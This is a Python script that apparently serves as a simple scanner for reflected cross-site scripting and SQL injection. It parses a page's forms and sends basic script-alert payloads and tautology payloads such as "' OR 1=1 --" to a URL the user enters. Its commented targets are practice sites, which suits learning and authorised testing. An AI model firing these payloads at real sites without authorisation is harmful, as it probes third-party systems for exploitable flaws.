import urllib.request
from bs4 import BeautifulSoup
from urllib.parse import urljoin
import requests


##############################################################
#############______________________________###################
############# AUTOMATIC TOOLS TO SCANNING  ###################
#############  SQL INJECTION & XSS ATTACK  ###################
#############------------------------------###################
############# Script by : Rizqy Rionaldy   ###################
##############################################################
# This script is made with 3 main function there are
# - generate_url(url) -> using for XSS Test
# - check_xss(url) -> using for XSS Test
# - check_sql_injection(url) -> using for SQL Injection Test
# 
# This script using Payload and Flag to Indicator Success
# - flagxss
# - xss_attacks
# - sql_indicator
# - sqli_payload
#
# First this script will running main function and get url based on user input
# Then, it will using generate_url(url) to identify FORM input, if form using Method Get/Post
# Check all field input in form, and knowing where the form will go if submit,
# this script will combine all field input as parameter to used in request, and
# concate with XSS_Attack payload as dictionary. This Dictionary related to url, params,
# and method (POST/GET). here example of dictionary:
# [('GET', "https://sudo.co.il/xss/level0.php?email=<script>alert('flagxss')</script>", None), 
# ('GET', 'https://sudo.co.il/xss/level0.php?email=<script>alert("flagxss")</script>', None), 
# ('GET', 'https://sudo.co.il/xss/level0.php?email=<title>flagxss</title>', None)]
#
# After that, this script will test that dictionary with function check_xss
# function check_xss then will check return of data, if containt Flag then return warning.
# if not, then Show notification that url is not contain XSS
#
# Second, this script will check about SQL injection. The method is
# URL input will be matching with SQL injection Payload. Then we make request
# after request successful we check the response text and matching with SQL injection Flag
# if match then show SQL Injection Posibility, if not show url not contain SQL Injection
#
# end


###############################################################
###################### DEFINE XSS FLAG AND PAYLOAD ############
###############################################################
# XSS Flag to help my program indentify return response from website
# if use flagxss then i sould make all of my XSS PAYLOAD contain flagxss indicator
flagxss = "flagxss"

# Here is my XSS payload
# i use just simple payload
xss_attacks = [
    "<script>alert('flagxss')</script>",
    "<script>alert(\"flagxss\")</script>",
    "<title>flagxss</title>"
]

###############################################################
###################### DEFINE XSS FLAG AND PAYLOAD ############
###############################################################

# SQLI Indicator is to help my program indentify response, if indicator match then maybe it posible SQL Injection
sqli_indicators = ["mysql_fetch_array()"]
# Here is my sqli Payload
sqli_payloads = [
    "' OR 1=1 --", 
    "' OR 'a'='a", 
    "' OR '1'='1", 
    '" OR "a"="a', 
    '" OR "1"="1'
]


def check_xss(url_info):
    #parsing url_info data structur to method, url, post_data
    method, url, post_data = url_info
    try:
        # Check based on method POST/GET
        if method == 'POST':
            post_data = urllib.parse.urlencode(post_data).encode('utf-8')
            req = urllib.request.Request(url, data=post_data, method='POST')
        else:
            req = urllib.request.Request(url)

        source = urllib.request.urlopen(req).read().decode('utf-8')
        
        # Try to match request result to XSS Flag, if matched the return True
        if flagxss in source.lower():
            print("[!] XSS:", url, "\n")
            return True
        
    # Handling Error
    except urllib.error.HTTPError as e:
        pass
    return False

def generate_urls(host):
    try:
        # Open url response return and parsing to HTML
        response = urllib.request.urlopen(host)
        html_content = response.read().decode('utf-8')
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Check for tag FORM -> we wil use it to group all input
        forms = soup.find_all('form')

        url_info_list = []
        for form in forms:
            # Get Attribute in Form like Url, Name Field, and Method
            
            # Method
            action = form.get('action')
            
            # Name Field
            input_fields = [input_tag.get('name', '') for input_tag in form.find_all('input') if input_tag.get('name')]

            if action:
                base_url = urljoin(host, action)
                method = form.get('method', 'get').lower()  # Default to 'get' if method is not specified

                # insert result into Array.
                # here is example
                # ('GET', "https://sudo.co.il/xss/level0.php?email=<script>alert('flagxss')</script>", None), 
                # ('GET', 'https://sudo.co.il/xss/level0.php?email=<script>alert("flagxss")</script>', None), 
                # ('GET', 'https://sudo.co.il/xss/level0.php?email=<title>flagxss</title>', None)
                
                if method == 'get':
                    for param in input_fields:
                        for exploit in xss_attacks:
                            url_with_param = f"{base_url}?{param}={exploit}"
                            url_info_list.append(('GET', url_with_param, None))  # None for post_data
                elif method == 'post':
                    for exploit in xss_attacks:
                        post_data = {param: exploit for param in input_fields}
                        url_info_list.append(('POST', base_url, post_data))

        return url_info_list
    except Exception as e:
        print("Error:", e)
        return []
    
def check_sql_injection(url):
    for payload in sqli_payloads:
        modified_url = url + payload
        response = requests.get(modified_url)

        for indicator in sqli_indicators:
            if indicator in response.text.lower():
                print(f"[!] Potential SQL Injection vulnerability found in payload: {payload} (Indicator: {indicator})")
                return True
    return False

def main():
    # host = "http://testphp.vulnweb.com/search.php"
    # host = "https://sudo.co.il/xss/level0.php" ## Test for XSS
    # host = "http://testphp.vulnweb.com/"
    # host = "http://testphp.vulnweb.com/artists.php?artist=1"
    
    host = input("Insert URL to Scanning : ")

    print("\n-- start test --\n")
    print("Scanning Host: ", host)
    print("\n/*Checking for XSS */")

    url_info_list = generate_urls(host)
    found_xss = False  # Inisialisasi variabel yang melacak apakah XSS telah ditemukan

    if url_info_list:
        for url_info in url_info_list:
            if check_xss(url_info):
                found_xss = True  # Mengatur variabel found_xss menjadi True jika XSS ditemukan
                break
    if not found_xss:
        print("No XSS found in any tested URLs.")  # Cetak pesan jika tidak ada XSS yang ditemukan

    print("\n/*Checking for SQL Injection */")
    if not check_sql_injection(host):
        print("No SQL Injection found in any tested URLs.")
        
    print("\n-- end test --\n")
        


if __name__ == "__main__":
    main()
